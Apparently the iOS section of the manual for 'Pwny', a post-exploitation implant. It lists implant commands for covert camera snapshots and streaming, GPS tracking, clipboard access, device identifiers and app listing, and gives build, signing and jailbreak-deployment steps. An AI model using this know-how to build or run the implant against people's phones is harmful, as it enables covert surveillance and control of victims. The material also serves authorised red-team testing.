# iOS (Apple iOS) — Pwny Documentation

This section covers everything specific to running Pwny on **Apple iOS** targets: platform-specific commands, building for iOS, and device capabilities.

---

## Table of Contents

- [iOS-Specific Commands](#ios-specific-commands)
  - [apps — Installed Applications](#apps--installed-applications)
  - [cam — Camera Capture](#cam--camera-capture)
  - [clipboard — Pasteboard Access](#clipboard--pasteboard-access)
  - [device — Device Information](#device--device-information)
  - [locate — GPS Location](#locate--gps-location)
  - [open — Open URLs & Applications](#open--open-urls--applications)
  - [say — Text-to-Speech](#say--text-to-speech)
  - [sbinfo — SpringBoard Information](#sbinfo--springboard-information)
- [Building for iOS](#building-for-ios)
- [iOS-Specific Notes](#ios-specific-notes)

---

## iOS-Specific Commands

iOS has the most unique command set, providing access to mobile-specific capabilities like GPS, app management, and text-to-speech.

### `apps` — Installed Applications

List all installed applications on the device by bundle ID.

```
pwny:/$ apps -l
[i] 0   : com.apple.mobilesafari
[i] 1   : com.apple.MobileSMS
[i] 2   : com.apple.camera
[i] 3   : com.spotify.client
[i] 4   : com.whatsapp.WhatsApp
...
```

**Filter by name:**
```
pwny:/$ apps -f Safari
```

---

### `cam` — Camera Capture

Capture photos from the device cameras.

**List cameras:**
```
pwny:/$ cam -l
Camera Devices
==============

 ID  Name
 --  ----
 0   Back Camera
 1   Front Camera
```

**Take a snapshot (front camera):**
```
pwny:/$ cam -s 1 -o /tmp/selfie.jpg
[+] Snapshot saved.
```

**Take a snapshot (back camera):**
```
pwny:/$ cam -s 0 -o /tmp/photo.jpg
[+] Snapshot saved.
```

**Stream camera feed:**
```
pwny:/$ cam -S 1
[*] Streaming from Front Camera... Press Ctrl+C to stop.
```

---

### `clipboard` — Pasteboard Access

Read and write the iOS general pasteboard.

**Read clipboard:**
```
pwny:/$ clipboard read
[i] Data:
https://example.com
```

**Write clipboard (interactive stdin):**
```
pwny:/$ clipboard write
[i] Start typing. Press Ctrl-D to submit.
new clipboard content
^D
```

---

### `device` — Device Information

Retrieve detailed device hardware and software information.

```
pwny:/$ device
[i] Name:    Felix's iPhone
[i] OS:      iOS 17.4.1
[i] Model:   iPhone15,2
[i] Serial:  F2LXX12345
[i] UDID:    00008110-001234567890ABCD
```

---

### `locate` — GPS Location

Get the device's current GPS coordinates. Displays an ASCII world map with the location plotted.

```
pwny:/$ locate
(ASCII world map with location marker)

     Latitude: 37.334886
     Longitude: -122.008988
     Map: http://maps.google.com/maps?q=37.334886,-122.008988
```

> **Note:** Location Services must be enabled on the device. The implant inherits location permissions from its host process.

---

### `open` — Open URLs & Applications

Open URLs in Safari or launch applications by bundle identifier.

**Open a URL:**
```
pwny:/$ open https://example.com
[+] URL opened in Safari.
```

**Open a URL scheme (launch app):**
```
pwny:/$ open tel://1234567890
[+] URL scheme opened.

pwny:/$ open facetime://user@example.com
[+] URL scheme opened.
```

Common URL schemes:
| Scheme | Opens |
|--------|-------|
| `https://...` | Safari |
| `tel://...` | Phone |
| `sms://...` | Messages |
| `facetime://...` | FaceTime |
| `maps://...` | Maps |
| `music://...` | Music |

---

### `say` — Text-to-Speech

Make the device speak text aloud using the system TTS engine.

```
pwny:/$ say "Hello, I have taken control of your device"
[+] Speaking...
```

**Useful for social engineering or demonstrations.**

---

### `sbinfo` — SpringBoard Information

Get basic information about the SpringBoard (iOS home screen manager).

```
pwny:/$ sbinfo
[i] Locked:   no
[i] Passcode: yes
```

SpringBoard info provides:
- **Locked** — Whether the device screen is currently locked
- **Passcode** — Whether a passcode is set on the device

---

## Building for iOS

### Prerequisites

- macOS host with Xcode installed
- iOS SDK (included with Xcode)
- CMake: `brew install cmake`
- Code signing identity or `sign.plist` for `ldid`

### Build Steps

```bash
# Build dependencies
make TARGET=aarch64-apple-ios

# Build implant
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain/cmake/aarch64-apple-ios.cmake \
      -DMAIN=ON -B build
cmake --build build

# Build with plugins
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain/cmake/aarch64-apple-ios.cmake \
      -DMAIN=ON -DPLUGINS=ON -B build
cmake --build build
```

### Supported Targets

| Target | Triple | Hardware |
|--------|--------|----------|
| ARM64 | `aarch64-apple-ios` | All modern iPhones/iPads (A7+) |
| ARM | `arm-apple-ios` | Older 32-bit devices (legacy) |

### Build Artifacts

| File | Description |
|------|-------------|
| `build/pwny` | Main implant Mach-O binary (iOS) |
| `pwny/tabs/apple_ios/<arch>/*` | Plugin bundles |

### Code Signing

iOS requires all executables to be code-signed. The build system uses `ldid` with the entitlements in `deps/sign.plist`:

```bash
# Sign with entitlements
ldid -Sdeps/sign.plist build/pwny
```

---

## iOS-Specific Notes

### Jailbreak & Deployment

Pwny on iOS typically requires a **jailbroken** device or an exploit chain for deployment:

- On jailbroken devices, the implant can be deployed via SSH or a file manager
- The implant runs as a daemon or is injected into an existing process
- Root access provides unrestricted access to all device capabilities

### Sandbox Restrictions

Without jailbreak, iOS enforces strict sandboxing:
- Apps cannot access other apps' data
- System-wide keylogging is not possible
- GPS, camera, and microphone require entitlements

With jailbreak/root:
- Full filesystem access
- Access to all hardware sensors
- Process injection capabilities
- No sandbox restrictions

### Filesystem Layout

iOS uses a POSIX filesystem, but with Apple-specific paths:

```
/                           → Root
├── Applications/           → System apps
├── var/
│   ├── mobile/             → Mobile user home
│   │   ├── Documents/
│   │   ├── Library/
│   │   └── Media/
│   ├── containers/Bundle/  → App bundles
│   └── containers/Data/    → App data
├── System/Library/         → System frameworks
└── usr/                    → UNIX utilities
```

```
pwny:/$ cd /var/mobile
pwny:/var/mobile$ ls
Documents/  Library/  Media/
```

### Network & Connectivity

iOS devices may switch between WiFi and cellular:
- `ifconfig` shows active network interfaces
- `netstat` shows active connections
- Use `sbinfo` to check WiFi SSID and carrier

---

## See Also

- [Commands Reference](../commands.md) — cross-platform commands
- [Console Features](../console.md) — prompt, banners, environment
- [Plugin Development](../plugin-development.md) — writing your own plugins
- [Building Guide](../building.md) — full build instructions
